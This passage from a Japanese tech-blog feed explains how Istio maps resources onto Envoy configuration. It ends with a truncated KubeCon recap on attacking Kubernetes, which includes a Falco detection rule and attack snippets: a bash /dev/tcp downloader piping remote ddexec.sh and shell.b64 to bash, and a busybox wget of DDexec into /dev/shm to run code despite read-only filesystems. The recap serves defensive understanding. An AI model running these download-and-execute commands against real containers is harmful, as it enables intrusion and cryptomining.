EnvoyがHTTPを検知できるようにします。    TLS Inspector      EnvoyがTLSを検知できるようにします。TLSを検知した場合、EnvoyはTLSに関する処理を実行します。例えば、DownstreamTlsContextは、リスナーフィルター直後に、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。また、UpstreamTlsContextは、クラスターの処理時に、宛先との間でTLS接続を確立し、L7のアプリケーションデータを暗号化します。    ネットワークフィルター      HTTP connection manager      Envoyが、L7のアプリケーションデータを読み取り、また後続のHTTPフィルターを制御できるようにします。    HTTPフィルター      Router      Envoyがポート番号でルート、ホストやパスでクラスターを絞り込めるようにします。    gRPC-Web      EnvoyがHTTP/1.1で受信したHTTPSリクエストをHTTP/2に変換し、gRPCサーバーにプロキシできるようにします。    Filters — envoy 1.36.0-dev-64cb65 documentation▶︎ Istioがデフォルトで有効にするEnvoyの設定についてistio-proxyコンテナは、イメージのビルド時に、あらかじめ用意しておいたEnvoyの設定ファイルを組み込みます。そのため、istio-proxyコンテナ内のEnvoyは、多くの設定をデフォルトで有効にできます。Istioを利用する開発者が、EnvoyがHTTPSリクエストを処理するために必要なフィルターを有効にしなくてよいのも、Istioのおかげです。Istioほんまにありがとな\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F  istio/pilot/docker/Dockerfile.proxyv2 at 1.20.2 \xb7 istio/istio \xb7 GitHubistio/tools/packaging/common/envoy_bootstrap.json at 1.20.2 \xb7 istio/istio \xb7 GitHubフィルターチェーンの仕組みEnvoyは、複数のフィルターからなるフィルターチェーンを実行し、HTTPSを処理します。図中の番号に沿って、Envoyのフィルターチェーンの仕組みを解説します。各フィルターの機能は、前述したフィルターの一覧を参考にしてください\uD83D\uDE47\uD83C\uDFFBリスナーフィルター (Original Destination、HTTP Inspector、TLS Inspectorなど) を実行します。(1) でTLS InspectorがTLSを検知した場合、DownstreamTlsContextで宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。ネットワークフィルター (HTTP connection managerなど) を実行します。HTTPフィルター (Router、gRPC-Webなど) を実行します。Life of a Request — envoy 1.36.0-dev-64cb65 documentation▶ TCPリクエストを処理する場合についてTCP proxy — envoy 1.36.0-dev-64cb65 documentation05. リソースの設定からEnvoy設定への翻訳いよいよです\uD83D\uDD25Istioが各リソースをいずれのEnvoyの設定に翻訳しているのかを解説します。表で対応関係の一覧を示した後、istio-proxyコンテナ内のEnvoyに当てはめました。各リソースとEnvoyの設定の関係一覧Istioコントロールプレーンは、KubernetesリソースやIstioカスタムリソースの設定をEnvoyの設定に翻訳し、処理の流れに当てはめます。以下の通り、各リソースがいずれのEnvoyの設定を抽象化するのかを整理しました。リソースによっては、Envoyの複数の設定を抽象化します。なお、Istioの用意したEnvoyのフィルターのデフォルト値を変更するユースケースが少ないため、これを抽象化するEnvoyFilterについては言及しません。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          Debugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPTX | Internet | Computing- YouTubeサービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ外からのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio IngressGatewayの一部として使用します。ServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅            \xd7      ✅    ルート      ✅                  ✅            \xd7          クラスター      ✅                        ✅      \xd7      ✅    エンドポイント            ✅                  ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅      ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          宛先      リスナー      ✅                  ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          ▶︎ 送信元と宛先のNamespaceについてistio-ingress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio IngressGatewayを置くことで、Istio IngressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyでほとんど同じリソースが登場しますが、 Gatewayは送信元Envoyだけで登場します。リソースの種類だけに着目すると、以下になります。Gatewayが送信元Envoyだけで登場することがわかりやすくなりました。マイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから別のPodへのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。GatewayとServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            \xd7      ✅            \xd7      ✅    ルート      ✅            \xd7      ✅            \xd7          クラスター      ✅            \xd7            ✅      \xd7      ✅    エンドポイント            ✅      \xd7            ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          宛先      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで、同じリソースが登場します。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場することがわかりやすくなりました。サービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) へのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio EgressGatewayの一部として使用します。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。他の場合とは異なり、送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、異なるリソースが抽象化します。PeerAuthenticationだけは、話を簡単にするために送信元と宛先が同じNamespaceであると仮定しているので、同じリソースが抽象化します。送信元Envoyの設定の抽象化で登場するリソースが宛先では登場せず、逆も然りです。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualServiceX      〃Y      DestinationRuleX      〃Y      ServiceEntry      PeerAuthentication    送信元      リスナー      ✅                  ✅                              ✅    ルート      ✅                  ✅                                  クラスター      ✅                              ✅                  ✅    エンドポイント            ✅                        ✅                      宛先      リスナー                  ✅            ✅                        ✅    ルート                              ✅                            クラスター                                          ✅      ✅      ✅    エンドポイント                                          ✅      ✅          ▶︎ 送信元と宛先のNamespaceについてistio-egress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio EgressGatewayを置くことで、Istio EgressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで同じリソースが登場しません 。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場しないことがわかりやすくなりました。06. 翻訳されたEnvoy設定値を見てみる前章では、Envoyの具体的な設定値まで、言及しませんでした。本章では、さらに具体化します。各リソースの設定の翻訳によって、Envoyの具体的にどのような設定値になっているのかを解説します。Envoyの現在の設定を出力するEnvoyは、現在の設定を確認するためのエンドポイント (/config_dump) を公開しています。これにHTTPSリクエストを送信し、具体的な設定値を出力してみましょう\uD83D\uDC4D\uD83C\uDFFBリスナーを出力する/config_dumpのクエリストリングにresource={dynamic_listeners}をつけると、Envoyのリスナーを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -PAdministration interface — envoy 1.36.0-dev-b0c33a documentationConfigDump (proto) — envoy 1.36.0-dev-64cb65 documentation▶ 宛先情報を見やすくするyqコマンドについてyqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dルートを出力する/config_dumpのクエリストリングにresource={dynamic_route_configs}をつけると、Envoyのルートを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -PAdministration interface — envoy 1.36.0-dev-64cb65 documentationConfigDump (proto) — envoy 1.36.0-dev-64cb65 documentationクラスターを出力する/config_dumpのクエリストリングにresource={dynamic_active_clusters}をつけると、Envoyのクラスターを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -PAdministration interface — envoy 1.36.0-dev-b0c33a documentationConfigDump (proto) — envoy 1.36.0-dev-64cb65 documentationエンドポイントを出力する/config_dumpのクエリストリングにinclude_edsをつけると、Envoyのエンドポイントを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -PAdministration interface — envoy 1.36.0-dev-64cb65 documentationConfigDump (proto) — envoy 1.36.0-dev-64cb65 documentationSupported load balancers — envoy 1.36.0-dev-64cb65 documentation証明書を出力する/config_dumpのクエリストリングにresource={dynamic_active_secrets}をつけると、証明書を出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_secrets}\\" | yq -PConfigDump (proto) — envoy 1.36.0-dev-64cb65 documentationサービスメッシュ外からのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50000) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50000) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50000||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50000||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50000) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ istio-proxyコンテナのプロキシ先のIPアドレスについてistio-proxyコンテナは、ローカルホストを127.0.0.6とし、HTTPSリクエストをマイクロサービスに送信します。これは、127.0.0.1を指定してしまうと、istio-proxyコンテナからマイクロサービスへの通信がiptables上でループしてしまうためです。istio-proxyコンテナからマイクロサービスへの通信では、正しくはiptables上でISTIO_OUTPUTからPOSTROUTINGに通信を渡します。一方で、もしローカルホストが127.0.0.1であると、ISTIO_OUTPUTからISTIO_IN_REDIRECTに通信を渡すことになり、istio-proxyコンテナに再びリダイレクトしてしまいます。hatappi1225さんの解説が鬼わかりやすかったです\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F画像引用元：mercari engineeringInbound Forwarding - Google ドキュメントiptables から理解する Istio 1.10 から変更された Inbound Forwarding | メルカリエンジニアリングマイクロサービス間のHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50010) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50010) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50010||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50010) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。Istio流量管理实现机制深度解析-赵化冰的博客 | Zhaohuabing Blogサービスメッシュ外へのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：443) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：istio-egressgateway-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターをIstio EgressGateway 宛先ポートやホストで管理しています (例：outbound|443|istio-egressgateway-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Istio EgressGateway Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:443) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、Istio EgressGateway PodにL7ロードバランシングします。宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：external.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|443|external.com) 。エンドポイントを選びます。Envoyは、エンドポイントをエントリ済システムのIPアドレスや宛先ポートで管理しています (例：:50010) 。エントリ済システムのIPアドレスは、開発者が設定する必要はなく、EnvoyがDNSから動的に取得します。  エントリ済システムにHTTPSリクエストを送信します。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio07. おわりにIstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのか、またEnvoyがどのようにHTTPSリクエストを処理するのかを解説しました。次々とサービスメッシュツールが登場したとしても、それがEnvoyを使用したサービスメッシュである限り、最終的にはEnvoyの設定値に行き着きます。そのため、抽象化されたEnvoyがどのように通信を扱うのかを一度でも理解すれば、様々なサービスメッシュツールで知識を流用できると思います。Istioはもちろん、他のEnvoyによるサービスメッシュツール (Consul、Ciliumなど) を使っている方の参考にもなれば幸いです\uD83D\uDC4D\uD83C\uDFFB謝辞今回、Kubernetesのネットワークを調査するにあたり、以下の方に知見をご教授いただきました。@ken5owata さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2024-01-15T16:34:04.000Z","dateMiliSeconds":1705336444000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"k8sgpt-operator 開発メモ (ARM Mac 向け)","link":"https://zenn.dev/tozastation/articles/711f2bff2cc656","contentSnippet":"Kubernetes クラスタ構築 AMD64 コンテナ環境セットアップ ~ Lima VM ~https://github.com/lima-vm/limaGetting Started については README.md 参照Limaでは、事前に定義した内容でVMを作ることができますDocker 環境を構築する場合のサンプルも公開されていますhttps://github.com/lima-vm/lima/blob/master/examples/docker.yaml今回は、amd64 の VM を作成したいため、docker.yaml に以下の行を追記...","isoDate":"2024-01-10T00:17:57.000Z","dateMiliSeconds":1704845877000,"authorName":"tozastation","authorId":"tozastation"},{"title":"WSL の Linux から Windows のブラウザで URL を開く","link":"https://blog.1q77.com/2024/01/open-browser-in-wsl/","contentSnippet":"課題WSL の Linux 内で awscli を使って SSO 認証する場合の aws sso login 実行時や GitHub の CLI である gh (cli.github.com ) コマンドで gh auth login を実行した場合に可能であれば自動でブラウザで指定の URL が開かれますが、WSL の場合、Linux 内のブラウザを使うわけではないため何も設定していない状態だと開いてくれないのでひと手間かかって面倒です。","isoDate":"2024-01-07T11:43:53.000Z","dateMiliSeconds":1704627833000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2023年の振り返りをする","link":"https://nnaka2992.hatenablog.com/entry/zatu/2023_furikaeri","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2023-06-22 3-shake SRE Tech Talk #6これまで対外向けの登壇は行なったことが無かったのでこれが登壇デビューでした。DBREノススメ所属会社である株式会社スリーシェイクの主催するイベントでしたが、一度登壇すると登壇のハードルが低くなるのでとてもいい機会でした。今の会社にDBREerポジションで入社して6か月目の登壇なので今見ると当時と違う意見の部分もあったりしますが、今もDBREもSREも何なのか分かりません。2023-09-26 YugabyteDB Japan Meetup #3別件でYugabyte Japanの方と話していたところ、登壇してみないか？ と誘われたためホイホイ話しに行った登壇でした。紹介 データベース信頼性エンジニアリングSRETTの方ではSREの存在を認知している方が多いだろうと想定して何故DBREが必要なのか？ という話しをしたのに対して、こちらではDB関係者が多いと想いDBAとDBREという切り口で発表しました。YugabyteDBはドキュメントを始めから読む活動をしていたり(2023年後半はあまり出来ていませんが)、ローカル環境で動かして遊んだりはしていたもののYugabyteDBについて話せるほどの理解は(今も)なく次にYugabyteDB Japan Meetupで話す機会があればYugabyteDBについてを主題に話したいと思いました。2023-10-12 3-shake SRE Tech Talk #76月の登壇と同様に所属会社主催のイベントでした。KubernetesでDBを動かしたい2021年ごろにDBをKubernetesで動かす記事見て以来DB on Kubernetesには興味があったのですが、Kubernetes自体やデータベースのお勉強をしていたらなかなかDB on k8sまでたどりつけていませんでした。それをイベント駆動で無理やり勉強したのがこのイベントでした。内容としてはありきたりですが、Zalando Postgres Operatorを動かしましたというだけのものですが、ここでDB on k8sをさわってからはいろいろな機会でDB on k8sを触るようになりました。2023-12-26 第44回 PostgreSQLアンカンファレンス@オンライン年内最後の登壇はPostgreSQLアンカンファレンスでした。pgrollで実現するスキーマブルーグリーンデプロイメントちょうど登壇しやすいネタを抱えてたのとアドベントカレンダーでそーだいさんが運用・開発よりの話しが足りないと書いていたのを見て、DBREを名乗っているし話さなきゃいけないだろと思ったので登壇しました。もっと運用よりだったりサービス開発だったり設計よりの話も募集中です。 大体そういうの喋る担当が自分だけなのでめちゃめちゃ需要があるので気軽にどうぞ。登壇自体はpodman-composeとdocker composeの差分で悲しいライブデモになりました。検証環境と登壇環境はそろえなきゃいけないなと思いました。ブログ関連はてなブログでは主に読んだ論文やドキュメントについてまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。はてなブログでやっているYugabyteDBのドキュメントを全部読む取り組みは途中で止ってしまっているので動かします。zennの方は社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2024年は技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。アドベントカレンダーは大風呂敷で畳みきれなかったデータベースエンジニアのためのDB on Kubernetes入門ガイドに始まり、誰得なのかわからないAlloyDB omni on Kubernetesを眺めると続いて、sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメントを書きました。ターゲットは誰だったんですかね？まとめ2023年は今までインプット重視だったところからアウトプットを考えだした年でした。これはそろそろアウトプットをしなきゃいけないという思いもあったものの、2023年1月に現職に転職し社外へのアウトプットをする人が多くいたからという面も多大にあります。人は周りの5人の平均になるという言葉があるらしいですが、まさしくその例で環境が変り周りの人が変ったため個人の方向性も変ったのではないかと思います。外部にアウトプットすることが偉いわけではありませんが、外部に発信すると新しい機会も産まれましたし1来年以降も継続していきたいです。↩","isoDate":"2023-12-31T13:00:10.000Z","dateMiliSeconds":1704027610000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KubeCon NA 2023 Recap: Attacking Kubernetes 編","link":"https://kyohmizu.hatenablog.com/entry/2023/12/31/040720","contentSnippet":"本記事は 3-shake Advent Calendar 2023 最終日の記事です。こんにちは、きょー (@kyohmizu) です少し旬を逃してしまいましたが、KubeCon NA 2023 の振り返りをしたいと思います。私はKubeConにはリアル参加しておらず、後からセッション動画を見ました。Kubernetes 編」ということで、Kubernetes へのサイバー攻撃テクニックに関するセッションを3つご紹介します。ちなみに本内容は、先日開催された CloudNative Days Tokyo 2023 にてお話しするか検討していたのですが、準備期間とセッション時間 (20分) の都合で泣く泣く諦めたものになります。 speakerdeck.comそれではセッション紹介に入ります。K8s Post-Exploitation: Privilege Escalation, Sidecar Container Injection, and Runtime Securityセッション情報Kubernetes クラスタに侵入した攻撃者が行う攻撃手法と、その対策を紹介するセッションです。最初に TeamTNT の行った攻撃キャンペーンについて、過去の調査レポートをベースに説明しています。クラスタへの初期アクセスの後、kubelet API のデフォルトポート (10250) を狙ってネットワークスキャンをかけています。スキャンによって kubelet API を発見した場合、kubelet API にPOSTリクエストを送り、最終的にノード内の全コンテナに対しクリプトマイナーをダウンロードします。詳細は調査レポートを参照いただきたいですが、攻撃コードを見るとどのように攻撃が行われるのかイメージしやすいと思います。この攻撃はアプリコンテナ内でクリプトマイナーを実行するため、早期に発見されてしまう可能性があります。そこでより発見されにくい攻撃手法として、セッション後半では「Sidecar Injection 攻撃」を取り上げています。Sidecar Injection 攻撃 は Microsoft の「Threat Matrix for Kubernetes」で紹介されている攻撃テクニックです。ちなみに MITRE ATT&CK の Containers Matrix にはこのテクニックは含まれていません。Sidecar Injection 攻撃は名前の通り、Pod 内のサイドカーコンテナを標的とします。セッション内で攻撃のサンプルコードが公開されていましたが、Pod 内のサイドカーコンテナのみを選択しクリプトマイナーを実行することを目的としているようでした。個人的にあまりピンと来なかったのは、アプリコンテナではなくサイドカーコンテナを狙うことで本当に攻撃を秘匿できるのか？という点です。サイドカーかはあまり関係ない気がします。そして最後に、これらの攻撃に対するセキュリティ対策について説明しています。Kubernetes セキュリティとして、イメージスキャンアドミッションコントロールランタイムセキュリティの3つのカテゴリを挙げ、実行中のコンテナに対する攻撃にはランタイムセキュリティが有効であると述べています。Falco を取り上げ、今回の攻撃に対する Falco ルールも公開されました。- list: shell_binaries  items: [bash, csh, ksh, sh, tcsh, zsh, dash]- macro: shell_procs  condition: proc.name in (shell_binaries)- rule: shell_in_container  desc: notice shell activity within a container  condition: >    spawned process and    container and    shell_procs  output: >    shell in a container    (user=%user.name container_id=%container.id container_name=%container.name    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)  priority: WARNINGArbitrary Code & File Execution in R/O FS – Am I Write?セッション情報readOnlyRootFilesystem: true が設定されたコンテナにおいて、コンテナ内で攻撃コードを実行するテクニックを3つ紹介しています。Readonly Filesystem では、ファイルの読み込み (Read) と実行 (Execute) はできるが書き込み (Write) ができないという特徴があります。マルウェアを配置したりすることを防止します。ファイルレスマルウェアの攻撃も存在しますが、コンテナ内に curl や wget のようなツールが含まれていなければマルウェアをダウンロードできません。それではセッション内の3つのケースについて見ていきます。ここではすべてを紹介しきれないため、より詳しく知りたい方は動画を見たりツールを調べたりしてみてください。ケース1curl や wget のようなネットワークツールがない場合、どのように攻撃コードのファイルをダウンロードするのでしょうか？/dev/tcp を利用して TCP コネクションを確立し、ファイルをダウンロードしています。ただしダウンロードしたファイルを書き込むことはできないため、メモリ上で直接実行する必要があります。これには DDExec を使い、プロセスをハイジャックすることでファイルレス実行を可能にします。$ function __bindown () {  read proto server path <<<$(echo ${1//// })  FILE=/${path// //}  HOST-${server//:*}  PORT=${server//*:}  [[ x\\"$(HOST)\\" == x\\"${PORT}\\" ]] && PORT=8080  exec 3<>/dev/tcp/${HOST]/$PORT  echo -en \\"GET ${(FILE) HTTP/1.0\\\\r\\\\nHost: $(HOST)\\\\r\\\\n\\\\r\\\\n\\" >&3  (while read line; do  [[ \\"$line\\" == $\'\\\\r\' ]] && break  done && cat) <&3  exec 3>&-}$ __bindown http://192.168.88.4:8080/shell.b64 | bash <(__bindown http://192.168.88.4:8080/ddexec.sh)base64 エンコードした攻撃用バイナリと ddexec.sh をそれぞれダウンロードし、ddexec.sh は bash で実行します。ケース2今回はコンテナイメージとして alpine を利用しています (ケース1は nginx でした)。alpine には bash が存在せず、/dev/tcp をそのまま実行することができないため、別の方法でファイルのダウンロードを試みます。curl や wget は存在しませんが、alpine には busybox がインストールされています。ファイルのダウンロードには busybox wget を利用し、ダウンロード先には Readonly RootFS の中でも書き込み可能な tmpfs を選択しています。$ mount | grep shmshm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)バイナリコードを直接実行できる ddsc.sh をダウンロードし、/dev/shm に保存します。noexec でマウントされているためファイルの実行はできませんが、ddsc.sh はシェルスクリプトなので sh から実行可能です。$ dde=$(mktemp -p /dev/shm)$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/ddsc.sh > $dde$ code=$(mktemp -p /dev/shm)$ echo 